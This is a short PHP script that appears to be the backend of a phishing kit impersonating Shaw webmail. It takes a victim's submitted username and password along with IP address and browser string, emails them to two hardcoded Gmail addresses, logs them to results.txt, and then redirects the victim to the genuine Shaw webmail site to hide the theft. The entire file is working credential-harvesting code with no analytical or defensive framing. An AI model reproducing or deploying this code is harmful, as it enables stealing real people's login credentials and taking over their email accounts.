<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1 LOGINDetails---------------\n";
$message .= "USERNAME	: ".$_POST['UN']."\n";
$message .= "PASSWORD	: ".$_POST['PW']."\n";
$message .= "------created by medpage[679849675]-----------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------shawResult-------------------\n";
$send = "loveofwisdom119@gmail.com,groundsnetz@gmail.com";
$subject = "shawResult 1 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script type="text/javascript"> 

    window.top.location.href = "https://webmail.shaw.ca/";
</script>